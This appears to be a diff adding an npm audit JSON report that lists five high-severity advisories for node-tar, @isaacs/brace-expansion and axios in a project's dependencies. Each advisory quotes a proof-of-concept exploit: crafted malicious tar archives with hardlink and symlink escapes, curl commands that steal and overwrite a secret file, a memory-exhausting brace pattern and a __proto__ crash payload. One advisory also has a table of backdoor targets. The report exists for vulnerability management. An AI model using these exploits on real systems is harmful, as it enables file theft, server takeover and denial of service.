@@ -1,0 +1,271 @@
+{
+  "actions": [
+    {
+      "action": "update",
+      "resolves": [
+        {
+          "id": 1112954,
+          "path": "apps__client>@capacitor/cli>rimraf>glob>minimatch>@isaacs/brace-expansion",
+          "dev": false,
+          "optional": false,
+          "bundled": false
+        }
+      ],
+      "module": "@isaacs/brace-expansion",
+      "target": "5.0.1",
+      "depth": 6
+    },
+    {
+      "action": "review",
+      "module": "tar",
+      "resolves": [
+        {
+          "id": 1112255,
+          "path": "apps__client>@capacitor/cli>tar",
+          "dev": false,
+          "optional": false,
+          "bundled": false
+        },
+        {
+          "id": 1112329,
+          "path": "apps__client>@capacitor/cli>tar",
+          "dev": false,
+          "optional": false,
+          "bundled": false
+        },
+        {
+          "id": 1112659,
+          "path": "apps__client>@capacitor/cli>tar",
+          "dev": false,
+          "optional": false,
+          "bundled": false
+        }
+      ]
+    },
+    {
+      "action": "review",
+      "module": "axios",
+      "resolves": [
+        {
+          "id": 1113092,
+          "path": "apps__backend>axios",
+          "dev": false,
+          "optional": false,
+          "bundled": false
+        }
+      ]
+    }
+  ],
+  "advisories": {
+    "1112255": {
+      "findings": [
+        {
+          "version": "6.2.1",
+          "paths": [
+            "apps\\client > @capacitor/cli@8.0.1 > tar@6.2.1"
+          ]
+        }
+      ],
+      "found_by": null,
+      "deleted": null,
+      "references": "- https://github.com/isaacs/node-tar/security/advisories/GHSA-8qq5-rm4j-mr97\n- https://github.com/isaacs/node-tar/commit/340eb285b6d986e91969a1170d7fe9b0face405e\n- https://github.com/advisories/GHSA-8qq5-rm4j-mr97",
+      "created": "2026-01-16T21:16:20.000Z",
+      "id": 1112255,
+      "npm_advisory_id": null,
+      "overview": "### Summary\n\nThe `node-tar` library (`<= 7.5.2`) fails to sanitize the `linkpath` of `Link` (hardlink) and `SymbolicLink` entries when `preservePaths` is false (the default secure behavior). This allows malicious archives to bypass the extraction root restriction, leading to **Arbitrary File Overwrite** via hardlinks and **Symlink Poisoning** via absolute symlink targets.\n\n### Details\n\nThe vulnerability exists in `src/unpack.ts` within the `[HARDLINK]` and `[SYMLINK]` methods.\n\n**1. Hardlink Escape (Arbitrary File Overwrite)**\n\nThe extraction logic uses `path.resolve(this.cwd, entry.linkpath)` to determine the hardlink target. Standard Node.js behavior dictates that if the second argument (`entry.linkpath`) is an **absolute path**, `path.resolve` ignores the first argument (`this.cwd`) entirely and returns the absolute path.\n\nThe library fails to validate that this resolved target remains within the extraction root. A malicious archive can create a hardlink to a sensitive file on the host (e.g., `/etc/passwd`) and subsequently write to it, if file permissions allow writing to the target file, bypassing path-based security measures that may be in place.\n\n**2. Symlink Poisoning**\n\nThe extraction logic passes the user-supplied `entry.linkpath` directly to `fs.symlink` without validation. This allows the creation of symbolic links pointing to sensitive absolute system paths or traversing paths (`../../`), even when secure extraction defaults are used.\n\n### PoC\n\nThe following script generates a binary TAR archive containing malicious headers (a hardlink to a local file and a symlink to `/etc/passwd`). It then extracts the archive using standard `node-tar` settings and demonstrates the vulnerability by verifying that the local \"secret\" file was successfully overwritten.\n\n```javascript\nconst fs = require('fs')\nconst path = require('path')\nconst tar = require('tar')\n\nconst out = path.resolve('out_repro')\nconst secret = path.resolve('secret.txt')\nconst tarFile = path.resolve('exploit.tar')\nconst targetSym = '/etc/passwd'\n\n// Cleanup & Setup\ntry { fs.rmSync(out, {recursive:true, force:true}); fs.unlinkSync(secret) } catch {}\nfs.mkdirSync(out)\nfs.writeFileSync(secret, 'ORIGINAL_DATA')\n\n// 1. Craft malicious Link header (Hardlink to absolute local file)\nconst h1 = new tar.Header({\n  path: 'exploit_hard',\n  type: 'Link',\n  size: 0,\n  linkpath: secret \n})\nh1.encode()\n\n// 2. Craft malicious Symlink header (Symlink to /etc/passwd)\nconst h2 = new tar.Header({\n  path: 'exploit_sym',\n  type: 'SymbolicLink',\n  size: 0,\n  linkpath: targetSym \n})\nh2.encode()\n\n// Write binary tar\nfs.writeFileSync(tarFile, Buffer.concat([ h1.block, h2.block, Buffer.alloc(1024) ]))\n\nconsole.log('[*] Extracting malicious tarball...')\n\n// 3. Extract with default secure settings\ntar.x({\n  cwd: out,\n  file: tarFile,\n  preservePaths: false\n}).then(() => {\n  console.log('[*] Verifying payload...')\n\n  // Test Hardlink Overwrite\n  try {\n    fs.writeFileSync(path.join(out, 'exploit_hard'), 'OVERWRITTEN')\n    \n    if (fs.readFileSync(secret, 'utf8') === 'OVERWRITTEN') {\n      console.log('[+] VULN CONFIRMED: Hardlink overwrite successful')\n    } else {\n      console.log('[-] Hardlink failed')\n    }\n  } catch (e) {}\n\n  // Test Symlink Poisoning\n  try {\n    if (fs.readlinkSync(path.join(out, 'exploit_sym')) === targetSym) {\n      console.log('[+] VULN CONFIRMED: Symlink points to absolute path')\n    } else {\n      console.log('[-] Symlink failed')\n    }\n  } catch (e) {}\n})\n\n```\n\n### Impact\n\n* **Arbitrary File Overwrite:** An attacker can overwrite any file the extraction process has access to, bypassing path-based security restrictions. It does not grant write access to files that the extraction process does not otherwise have access to, such as root-owned configuration files.\n* **Remote Code Execution (RCE):** In CI/CD environments or automated pipelines, overwriting configuration files, scripts, or binaries leads to code execution. (However, npm is unaffected, as it filters out all `Link` and `SymbolicLink` tar entries from extracted packages.)",
+      "reported_by": null,
+      "title": "node-tar is Vulnerable to Arbitrary File Overwrite and Symlink Poisoning via Insufficient Path Sanitization",
+      "metadata": null,
+      "cves": [
+        "CVE-2026-23745"
+      ],
+      "access": "public",
+      "severity": "high",
+      "module_name": "tar",
+      "vulnerable_versions": "<=7.5.2",
+      "github_advisory_id": "GHSA-8qq5-rm4j-mr97",
+      "recommendation": "Upgrade to version 7.5.3 or later",
+      "patched_versions": ">=7.5.3",
+      "updated": "2026-01-16T21:16:24.000Z",
+      "cvss": {
+        "score": 0,
+        "vectorString": null
+      },
+      "cwe": [
+        "CWE-22"
+      ],
+      "url": "https://github.com/advisories/GHSA-8qq5-rm4j-mr97"
+    },
+    "1112329": {
+      "findings": [
+        {
+          "version": "6.2.1",
+          "paths": [
+            "apps\\client > @capacitor/cli@8.0.1 > tar@6.2.1"
+          ]
+        }
+      ],
+      "found_by": null,
+      "deleted": null,
+      "references": "- https://github.com/isaacs/node-tar/security/advisories/GHSA-r6q2-hw4h-h46w\n- https://nvd.nist.gov/vuln/detail/CVE-2026-23950\n- https://github.com/isaacs/node-tar/commit/3b1abfae650056edfabcbe0a0df5954d390521e6\n- https://github.com/advisories/GHSA-r6q2-hw4h-h46w",
+      "created": "2026-01-21T01:05:49.000Z",
+      "id": 1112329,
+      "npm_advisory_id": null,
+      "overview": "**TITLE**: Race Condition in node-tar Path Reservations via Unicode Sharp-S (├ƒ) Collisions on macOS APFS\n\n**AUTHOR**: Tom├ís Illuminati\n\n### Details\n\nA race condition vulnerability exists in `node-tar` (v7.5.3) this is to an incomplete handling of Unicode path collisions in the `path-reservations` system. On case-insensitive or normalization-insensitive filesystems (such as macOS APFS, In which it has been tested), the library fails to lock colliding paths (e.g., `├ƒ` and `ss`), allowing them to be processed in parallel. This bypasses the library's internal concurrency safeguards and permits Symlink Poisoning attacks via race conditions. The library uses a `PathReservations` system to ensure that metadata checks and file operations for the same path are serialized. This prevents race conditions where one entry might clobber another concurrently.\n\n```typescript\n// node-tar/src/path-reservations.ts (Lines 53-62)\nreserve(paths: string[], fn: Handler) {\n    paths =\n      isWindows ?\n        ['win32 parallelization disabled']\n      : paths.map(p => {\n          return stripTrailingSlashes(\n            join(normalizeUnicode(p)), // <- THE PROBLEM FOR MacOS FS\n          ).toLowerCase()\n        })\n\n```\n\nIn MacOS the ```join(normalizeUnicode(p)), ``` FS confuses ├ƒ with ss, but this code does not. For example:\n\n``````bash\nbash-3.2$ printf \"CONTENT_SS\\n\" > collision_test_ss\nbash-3.2$ ls\ncollision_test_ss\nbash-3.2$ printf \"CONTENT_ESSZETT\\n\" > collision_test_├ƒ\nbash-3.2$ ls -la\ntotal 8\ndrwxr-xr-x   3 testuser  staff    96 Jan 19 01:25 .\ndrwxr-x---+ 82 testuser  staff  2624 Jan 19 01:25 ..\n-rw-r--r--   1 testuser  staff    16 Jan 19 01:26 collision_test_ss\nbash-3.2$ \n``````\n\n---\n\n### PoC\n\n``````javascript\nconst tar = require('tar');\nconst fs = require('fs');\nconst path = require('path');\nconst { PassThrough } = require('stream');\n\nconst exploitDir = path.resolve('race_exploit_dir');\nif (fs.existsSync(exploitDir)) fs.rmSync(exploitDir, { recursive: true, force: true });\nfs.mkdirSync(exploitDir);\n\nconsole.log('[*] Testing...');\nconsole.log(`[*] Extraction target: ${exploitDir}`);\n\n// Construct stream\nconst stream = new PassThrough();\n\nconst contentA = 'A'.repeat(1000);\nconst contentB = 'B'.repeat(1000);\n\n// Key 1: \"f_ss\"\nconst header1 = new tar.Header({\n    path: 'collision_ss',\n    mode: 0o644,\n    size: contentA.length,\n});\nheader1.encode();\n\n// Key 2: \"f_├ƒ\"\nconst header2 = new tar.Header({\n    path: 'collision_├ƒ',\n    mode: 0o644,\n    size: contentB.length,\n});\nheader2.encode();\n\n// Write to stream\nstream.write(header1.block);\nstream.write(contentA);\nstream.write(Buffer.alloc(512 - (contentA.length % 512))); // Padding\n\nstream.write(header2.block);\nstream.write(contentB);\nstream.write(Buffer.alloc(512 - (contentB.length % 512))); // Padding\n\n// End\nstream.write(Buffer.alloc(1024));\nstream.end();\n\n// Extract\nconst extract = new tar.Unpack({\n    cwd: exploitDir,\n    // Ensure jobs is high enough to allow parallel processing if locks fail\n    jobs: 8 \n});\n\nstream.pipe(extract);\n\nextract.on('end', () => {\n    console.log('[*] Extraction complete');\n\n    // Check what exists\n    const files = fs.readdirSync(exploitDir);\n    console.log('[*] Files in exploit dir:', files);\n    files.forEach(f => {\n        const p = path.join(exploitDir, f);\n        const stat = fs.statSync(p);\n        const content = fs.readFileSync(p, 'utf8');\n        console.log(`File: ${f}, Inode: ${stat.ino}, Content: ${content.substring(0, 10)}... (Length: ${content.length})`);\n    });\n\n    if (files.length === 1 || (files.length === 2 && fs.statSync(path.join(exploitDir, files[0])).ino === fs.statSync(path.join(exploitDir, files[1])).ino)) {\n        console.log('\\[*] GOOD');\n    } else {\n        console.log('[-] No collision');\n    }\n});\n\n``````\n\n---\n\n### Impact\nThis is a **Race Condition** which enables **Arbitrary File Overwrite**. This vulnerability affects users and systems using **node-tar on macOS (APFS/HFS+)**. Because of using `NFD` Unicode normalization (in which `├ƒ` and `ss` are different), conflicting paths do not have their order properly preserved under filesystems that ignore Unicode normalization (e.g., APFS (in which `├ƒ` causes an inode collision with `ss`)). This enables an attacker to circumvent internal parallelization locks (`PathReservations`) using conflicting filenames within a malicious tar archive.\n\n---\n\n### Remediation\n\nUpdate `path-reservations.js` to use a normalization form that matches the target filesystem's behavior (e.g., `NFKD`), followed by first `toLocaleLowerCase('en')` and then `toLocaleUpperCase('en')`.\n\nUsers who cannot upgrade promptly, and who are programmatically using `node-tar` to extract arbitrary tarball data should filter out all `SymbolicLink` entries (as npm does) to defend against arbitrary file writes via this file system entry name collision issue.\n\n---",
+      "reported_by": null,
+      "title": "Race Condition in node-tar Path Reservations via Unicode Ligature Collisions on macOS APFS",
+      "metadata": null,
+      "cves": [
+        "CVE-2026-23950"
+      ],
+      "access": "public",
+      "severity": "high",
+      "module_name": "tar",
+      "vulnerable_versions": "<=7.5.3",
+      "github_advisory_id": "GHSA-r6q2-hw4h-h46w",
+      "recommendation": "Upgrade to version 7.5.4 or later",
+      "patched_versions": ">=7.5.4",
+      "updated": "2026-01-21T01:05:50.000Z",
+      "cvss": {
+        "score": 8.8,
+        "vectorString": "CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:L/I:H/A:L"
+      },
+      "cwe": [
+        "CWE-176"
+      ],
+      "url": "https://github.com/advisories/GHSA-r6q2-hw4h-h46w"
+    },
+    "1112659": {
+      "findings": [
+        {
+          "version": "6.2.1",
+          "paths": [
+            "apps\\client > @capacitor/cli@8.0.1 > tar@6.2.1"
+          ]
+        }
+      ],
+      "found_by": null,
+      "deleted": null,
+      "references": "- https://github.com/isaacs/node-tar/security/advisories/GHSA-34x7-hfp2-rc4v\n- https://nvd.nist.gov/vuln/detail/CVE-2026-24842\n- https://github.com/isaacs/node-tar/commit/f4a7aa9bc3d717c987fdf1480ff7a64e87ffdb46\n- https://github.com/advisories/GHSA-34x7-hfp2-rc4v",
+      "created": "2026-01-28T16:35:31.000Z",
+      "id": 1112659,
+      "npm_advisory_id": null,
+      "overview": "### Summary\nnode-tar contains a vulnerability where the security check for hardlink entries uses different path resolution semantics than the actual hardlink creation logic. This mismatch allows an attacker to craft a malicious TAR archive that bypasses path traversal protections and creates hardlinks to arbitrary files outside the extraction directory.\n\n### Details\nThe vulnerability exists in `lib/unpack.js`. When extracting a hardlink, two functions handle the linkpath differently:\n\n**Security check in `[STRIPABSOLUTEPATH]`:**\n```javascript\nconst entryDir = path.posix.dirname(entry.path);\nconst resolved = path.posix.normalize(path.posix.join(entryDir, linkpath));\nif (resolved.startsWith('../')) { /* block */ }\n```\n\n**Hardlink creation in `[HARDLINK]`:**\n```javascript\nconst linkpath = path.resolve(this.cwd, entry.linkpath);\nfs.linkSync(linkpath, dest);\n```\n\n**Example:** An application extracts a TAR using `tar.extract({ cwd: '/var/app/uploads/' })`. The TAR contains entry `a/b/c/d/x` as a hardlink to `../../../../etc/passwd`.\n\n- **Security check** resolves the linkpath relative to the entry's parent directory: `a/b/c/d/ + ../../../../etc/passwd` = `etc/passwd`. No `../` prefix, so it **passes**.\n\n- **Hardlink creation** resolves the linkpath relative to the extraction directory (`this.cwd`): `/var/app/uploads/ + ../../../../etc/passwd` = `/etc/passwd`. This **escapes** to the system's `/etc/passwd`.\n\nThe security check and hardlink creation use different starting points (entry directory `a/b/c/d/` vs extraction directory `/var/app/uploads/`), so the same linkpath can pass validation but still escape. The deeper the entry path, the more levels an attacker can escape.\n\n### PoC\n#### Setup\n\nCreate a new directory with these files:\n\n```\npoc/\nΓö£ΓöÇΓöÇ package.json\nΓö£ΓöÇΓöÇ secret.txt          ΓåÉ sensitive file (target)\nΓö£ΓöÇΓöÇ server.js           ΓåÉ vulnerable server\nΓö£ΓöÇΓöÇ create-malicious-tar.js\nΓö£ΓöÇΓöÇ verify.js\nΓööΓöÇΓöÇ uploads/            ΓåÉ created automatically by server.js\n    ΓööΓöÇΓöÇ (extracted files go here)\n```\n\n**package.json**\n```json\n{ \"dependencies\": { \"tar\": \"^7.5.0\" } }\n```\n\n**secret.txt** (sensitive file outside uploads/)\n```\nDATABASE_PASSWORD=supersecret123\n```\n\n**server.js** (vulnerable file upload server)\n```javascript\nconst http = require('http');\nconst fs = require('fs');\nconst path = require('path');\nconst tar = require('tar');\n\nconst PORT = 3000;\nconst UPLOAD_DIR = path.join(__dirname, 'uploads');\nfs.mkdirSync(UPLOAD_DIR, { recursive: true });\n\nhttp.createServer((req, res) => {\n  if (req.method === 'POST' && req.url === '/upload') {\n    const chunks = [];\n    req.on('data', c => chunks.push(c));\n    req.on('end', async () => {\n      fs.writeFileSync(path.join(UPLOAD_DIR, 'upload.tar'), Buffer.concat(chunks));\n      await tar.extract({ file: path.join(UPLOAD_DIR, 'upload.tar'), cwd: UPLOAD_DIR });\n      res.end('Extracted\\n');\n    });\n  } else if (req.method === 'GET' && req.url === '/read') {\n    // Simulates app serving extracted files (e.g., file download, static assets)\n    const targetPath = path.join(UPLOAD_DIR, 'd', 'x');\n    if (fs.existsSync(targetPath)) {\n      res.end(fs.readFileSync(targetPath));\n    } else {\n      res.end('File not found\\n');\n    }\n  } else if (req.method === 'POST' && req.url === '/write') {\n    // Simulates app writing to extracted file (e.g., config update, log append)\n    const chunks = [];\n    req.on('data', c => chunks.push(c));\n    req.on('end', () => {\n      const targetPath = path.join(UPLOAD_DIR, 'd', 'x');\n      if (fs.existsSync(targetPath)) {\n        fs.writeFileSync(targetPath, Buffer.concat(chunks));\n        res.end('Written\\n');\n      } else {\n        res.end('File not found\\n');\n      }\n    });\n  } else {\n    res.end('POST /upload, GET /read, or POST /write\\n');\n  }\n}).listen(PORT, () => console.log(`http://localhost:${PORT}`));\n```\n\n**create-malicious-tar.js** (attacker creates exploit TAR)\n```javascript\nconst fs = require('fs');\n\nfunction tarHeader(name, type, linkpath = '', size = 0) {\n  const b = Buffer.alloc(512, 0);\n  b.write(name, 0); b.write('0000644', 100); b.write('0000000', 108);\n  b.write('0000000', 116); b.write(size.toString(8).padStart(11, '0'), 124);\n  b.write(Math.floor(Date.now()/1000).toString(8).padStart(11, '0'), 136);\n  b.write('        ', 148);\n  b[156] = type === 'dir' ? 53 : type === 'link' ? 49 : 48;\n  if (linkpath) b.write(linkpath, 157);\n  b.write('ustar\\x00', 257); b.write('00', 263);\n  let sum = 0; for (let i = 0; i < 512; i++) sum += b[i];\n  b.write(sum.toString(8).padStart(6, '0') + '\\x00 ', 148);\n  return b;\n}\n\n// Hardlink escapes to parent directory's secret.txt\nfs.writeFileSync('malicious.tar', Buffer.concat([\n  tarHeader('d/', 'dir'),\n  tarHeader('d/x', 'link', '../secret.txt'),\n  Buffer.alloc(1024)\n]));\nconsole.log('Created malicious.tar');\n```\n\n#### Run\n\n```bash\n# Setup\nnpm install\necho \"DATABASE_PASSWORD=supersecret123\" > secret.txt\n\n# Terminal 1: Start server\nnode server.js\n\n# Terminal 2: Execute attack\nnode create-malicious-tar.js\ncurl -X POST --data-binary @malicious.tar http://localhost:3000/upload\n\n# READ ATTACK: Steal secret.txt content via the hardlink\ncurl http://localhost:3000/read\n# Returns: DATABASE_PASSWORD=supersecret123\n\n# WRITE ATTACK: Overwrite secret.txt through the hardlink\ncurl -X POST -d \"PWNED\" http://localhost:3000/write\n\n# Confirm secret.txt was modified\ncat secret.txt\n```\n### Impact\n\nAn attacker can craft a malicious TAR archive that, when extracted by an application using node-tar, creates hardlinks that escape the extraction directory. This enables:\n\n**Immediate (Read Attack):** If the application serves extracted files, attacker can read any file readable by the process.\n\n**Conditional (Write Attack):** If the application later writes to the hardlink path, it modifies the target file outside the extraction directory.\n\n### Remote Code Execution / Server Takeover\n\n| Attack Vector | Target File | Result |\n|--------------|-------------|--------|\n| SSH Access | `~/.ssh/authorized_keys` | Direct shell access to server |\n| Cron Backdoor | `/etc/cron.d/*`, `~/.crontab` | Persistent code execution |\n| Shell RC Files | `~/.bashrc`, `~/.profile` | Code execution on user login |\n| Web App Backdoor | Application `.js`, `.php`, `.py` files | Immediate RCE via web requests |\n| Systemd Services | `/etc/systemd/system/*.service` | Code execution on service restart |\n| User Creation | `/etc/passwd` (if running as root) | Add new privileged user |\n\n## Data Exfiltration & Corruption\n\n1. **Overwrite arbitrary files** via hardlink escape + subsequent write operations\n2. **Read sensitive files** by creating hardlinks that point outside extraction directory\n3. **Corrupt databases** and application state\n4. **Steal credentials** from config files, `.env`, secrets",
+      "reported_by": null,
+      "title": "node-tar Vulnerable to Arbitrary File Creation/Overwrite via Hardlink Path Traversal",
+      "metadata": null,
+      "cves": [
+        "CVE-2026-24842"
+      ],
+      "access": "public",
+      "severity": "high",
+      "module_name": "tar",
+      "vulnerable_versions": "<7.5.7",
+      "github_advisory_id": "GHSA-34x7-hfp2-rc4v",
+      "recommendation": "Upgrade to version 7.5.7 or later",
+      "patched_versions": ">=7.5.7",
+      "updated": "2026-01-28T16:35:31.000Z",
+      "cvss": {
+        "score": 8.2,
+        "vectorString": "CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:H/I:L/A:N"
+      },
+      "cwe": [
+        "CWE-22",
+        "CWE-59"
+      ],
+      "url": "https://github.com/advisories/GHSA-34x7-hfp2-rc4v"
+    },
+    "1112954": {
+      "findings": [
+        {
+          "version": "5.0.0",
+          "paths": [
+            "apps\\client > @capacitor/cli@8.0.1 > rimraf@6.1.2 > glob@13.0.0 > minimatch@10.1.1 > @isaacs/brace-expansion@5.0.0"
+          ]
+        }
+      ],
+      "found_by": null,
+      "deleted": null,
+      "references": "- https://github.com/isaacs/brace-expansion/security/advisories/GHSA-7h2j-956f-4vf2\n- https://nvd.nist.gov/vuln/detail/CVE-2026-25547\n- https://github.com/advisories/GHSA-7h2j-956f-4vf2",
+      "created": "2026-02-03T19:41:15.000Z",
+      "id": 1112954,
+      "npm_advisory_id": null,
+      "overview": "### Summary\n\n`@isaacs/brace-expansion` is vulnerable to a Denial of Service (DoS) issue caused by unbounded brace range expansion. When an attacker provides a pattern containing repeated numeric brace ranges, the library attempts to eagerly generate every possible combination synchronously. Because the expansion grows exponentially, even a small input can consume excessive CPU and memory and may crash the Node.js process.\n\n### Details\n\nThe vulnerability occurs because `@isaacs/brace-expansion` expands brace expressions without any upper bound or complexity limit. Expansion is performed eagerly and synchronously, meaning the full result set is generated before returning control to the caller.\n\nFor example, the following input:\n\n```\n{0..99}{0..99}{0..99}{0..99}{0..99}\n```\n\nproduces:\n\n```\n100^5 = 10,000,000,000 combinations\n```\n\nThis exponential growth can quickly overwhelm the event loop and heap memory, resulting in process termination.\n\n### Proof of Concept\n\nThe following script reliably triggers the issue.\n\nCreate `poc.js`:\n\n```js\nconst { expand } = require('@isaacs/brace-expansion');\n\nconst pattern = '{0..99}{0..99}{0..99}{0..99}{0..99}';\n\nconsole.log('Starting expansion...');\nexpand(pattern);\n```\n\nRun it:\n\n```bash\nnode poc.js\n```\n\nThe process will freeze and typically crash with an error such as:\n\n```\nFATAL ERROR: JavaScript heap out of memory\n```\n\n### Impact\n\nThis is a denial of service vulnerability. Any application or downstream dependency that uses `@isaacs/brace-expansion` on untrusted input may be vulnerable to a single-request crash.\n\nAn attacker does not require authentication and can use a very small payload to:\n\n* Trigger exponential computation\n* Exhaust memory and CPU resources\n* Block the event loop\n* Crash Node.js services relying on this library",
+      "reported_by": null,
+      "title": "@isaacs/brace-expansion has Uncontrolled Resource Consumption",
+      "metadata": null,
+      "cves": [
+        "CVE-2026-25547"
+      ],
+      "access": "public",
+      "severity": "high",
+      "module_name": "@isaacs/brace-expansion",
+      "vulnerable_versions": "<=5.0.0",
+      "github_advisory_id": "GHSA-7h2j-956f-4vf2",
+      "recommendation": "Upgrade to version 5.0.1 or later",
+      "patched_versions": ">=5.0.1",
+      "updated": "2026-02-05T00:36:55.000Z",
+      "cvss": {
+        "score": 0,
+        "vectorString": null
+      },
+      "cwe": [
+        "CWE-1333"
+      ],
+      "url": "https://github.com/advisories/GHSA-7h2j-956f-4vf2"
+    },
+    "1113092": {
+      "findings": [
+        {
+          "version": "1.13.2",
+          "paths": [
+            "apps\\backend > axios@1.13.2"
+          ]
+        }
+      ],
+      "found_by": null,
+      "deleted": null,
+      "references": "- https://github.com/axios/axios/security/advisories/GHSA-43fc-jf86-j433\n- https://github.com/axios/axios/pull/7369\n- https://github.com/axios/axios/commit/28c721588c7a77e7503d0a434e016f852c597b57\n- https://github.com/axios/axios/releases/tag/v1.13.5\n- https://nvd.nist.gov/vuln/detail/CVE-2026-25639\n- https://github.com/advisories/GHSA-43fc-jf86-j433",
+      "created": "2026-02-09T17:46:14.000Z",
+      "id": 1113092,
+      "npm_advisory_id": null,
+      "overview": "# Denial of Service via **proto** Key in mergeConfig\n\n### Summary\n\nThe `mergeConfig` function in axios crashes with a TypeError when processing configuration objects containing `__proto__` as an own property. An attacker can trigger this by providing a malicious configuration object created via `JSON.parse()`, causing complete denial of service.\n\n### Details\n\nThe vulnerability exists in `lib/core/mergeConfig.js` at lines 98-101:\n\n```javascript\nutils.forEach(Object.keys({ ...config1, ...config2 }), function computeConfigValue(prop) {\n  const merge = mergeMap[prop] || mergeDeepProperties;\n  const configValue = merge(config1[prop], config2[prop], prop);\n  (utils.isUndefined(configValue) && merge !== mergeDirectKeys) || (config[prop] = configValue);\n});\n```\n\nWhen `prop` is `'__proto__'`:\n\n1. `JSON.parse('{\"__proto__\": {...}}')` creates an object with `__proto__` as an own enumerable property\n2. `Object.keys()` includes `'__proto__'` in the iteration\n3. `mergeMap['__proto__']` performs prototype chain lookup, returning `Object.prototype` (truthy object)\n4. The expression `mergeMap[prop] || mergeDeepProperties` evaluates to `Object.prototype`\n5. `Object.prototype(...)` throws `TypeError: merge is not a function`\n\nThe `mergeConfig` function is called by:\n\n- `Axios._request()` at `lib/core/Axios.js:75`\n- `Axios.getUri()` at `lib/core/Axios.js:201`\n- All HTTP method shortcuts (`get`, `post`, etc.) at `lib/core/Axios.js:211,224`\n\n### PoC\n\n```javascript\nimport axios from \"axios\";\n\nconst maliciousConfig = JSON.parse('{\"__proto__\": {\"x\": 1}}');\nawait axios.get(\"https://httpbin.org/get\", maliciousConfig);\n```\n\n**Reproduction steps:**\n\n1. Clone axios repository or `npm install axios`\n2. Create file `poc.mjs` with the code above\n3. Run: `node poc.mjs`\n4. Observe the TypeError crash\n\n**Verified output (axios 1.13.4):**\n\n```\nTypeError: merge is not a function\n    at computeConfigValue (lib/core/mergeConfig.js:100:25)\n    at Object.forEach (lib/utils.js:280:10)\n    at mergeConfig (lib/core/mergeConfig.js:98:9)\n```\n\n**Control tests performed:**\n| Test | Config | Result |\n|------|--------|--------|\n| Normal config | `{\"timeout\": 5000}` | SUCCESS |\n| Malicious config | `JSON.parse('{\"__proto__\": {\"x\": 1}}')` | **CRASH** |\n| Nested object | `{\"headers\": {\"X-Test\": \"value\"}}` | SUCCESS |\n\n**Attack scenario:**\nAn application that accepts user input, parses it with `JSON.parse()`, and passes it to axios configuration will crash when receiving the payload `{\"__proto__\": {\"x\": 1}}`.\n\n### Impact\n\n**Denial of Service** - Any application using axios that processes user-controlled JSON and passes it to axios configuration methods is vulnerable. The application will crash when processing the malicious payload.\n\nAffected environments:\n\n- Node.js servers using axios for HTTP requests\n- Any backend that passes parsed JSON to axios configuration\n\nThis is NOT prototype pollution - the application crashes before any assignment occurs.",
+      "reported_by": null,
+      "title": "Axios is Vulnerable to Denial of Service via __proto__ Key in mergeConfig",
+      "metadata": null,
+      "cves": [
+        "CVE-2026-25639"
+      ],
+      "access": "public",
+      "severity": "high",
+      "module_name": "axios",
+      "vulnerable_versions": "<=1.13.4",
+      "github_advisory_id": "GHSA-43fc-jf86-j433",
+      "recommendation": "Upgrade to version 1.13.5 or later",
+      "patched_versions": ">=1.13.5",
+      "updated": "2026-02-09T22:39:36.000Z",
+      "cvss": {
+        "score": 7.5,
+        "vectorString": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H"
+      },
+      "cwe": [
+        "CWE-754"
+      ],
+      "url": "https://github.com/advisories/GHSA-43fc-jf86-j433"
+    }
+  },
+  "muted": [],
+  "metadata": {
+    "vulnerabilities": {
+      "info": 0,
+      "low": 0,
+      "moderate": 0,
+      "high": 5,
+      "critical": 0
+    },
+    "dependencies": 674,
+    "devDependencies": 0,
+    "optionalDependencies": 0,
+    "totalDependencies": 674
+  }
+}
